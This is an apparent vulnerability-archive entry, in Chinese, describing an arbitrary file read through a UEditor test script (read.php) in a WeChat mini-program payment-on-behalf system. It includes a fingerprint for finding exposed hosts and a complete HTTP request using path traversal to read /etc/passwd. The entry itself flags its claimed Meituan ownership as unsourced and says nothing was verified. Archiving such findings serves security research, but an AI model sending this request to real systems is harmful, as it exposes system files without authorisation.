---
source: "wy876 漏洞文库"
title: "第三方代付微信小程序系统（厂商待核） UEditor测试工具read.php文件读取"
product: "第三方代付微信小程序系统（厂商待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，测试工具可访问"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ymuepw56n41ianbg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%BE%8E%E5%9B%A2%E4%BB%A3%E4%BB%98%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E7%BE%8E%E5%9B%A2%E4%BB%A3%E4%BB%98%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9Fread%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-ce38e020eb254afe8f5a04fd"
entity_id: "ve-ce38e020eb254afe8f5a04fd"
schema_version: "1"
---

# 第三方代付微信小程序系统（厂商待核） UEditor测试工具read.php文件读取

## 条目说明

- 对象与具体问题：第三方代付微信小程序系统（厂商待核）；UEditor测试工具read.php文件读取
- 版本、配置及部署条件：版本未知，测试工具可访问
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 简介直接称美团点评旗下但无任何出处，重大厂商归属风险；后台代理/推广功能不能证明官方关联
- HTML字体残留、支付重求错字、产品营销冗长；chunk-vendors泛指纹不足唯一识别
- 无返回、受影响版本或修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
美团代付微信小程序系统是美团点评旗下的一款基于微信小程序技术开发的应用程序功能之一，它允许用户方便快捷地请求他人为自己支付订单费用。随着移动支付的普及和微信小程序的广泛应用，美团作为中国领先的本地生活服务平台，推出了代付功能，以满足用户多样化的支付重求。通过微信小程序，用户可以轻松实现代付操作，无需跳转到其他应用或网页，提高了支付的便捷性和效率。前台支持购物车，个人中心，多选项等功能 ，后台支持推广，代理管理，菜品管理，积分明细，订单管理，模板，支付通道管理等功能。美团代付微信小程序系统read存在任意文件读取漏洞

## 二、影响版本
+ 美团代付微信小程序系统 

## 三、资产测绘
```plain
body="/h5/static/js/chunk-vendors.js"
```


## 四、漏洞复现
```http
POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
 
name=../../../../../../../../../etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ymuepw56n41ianbg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
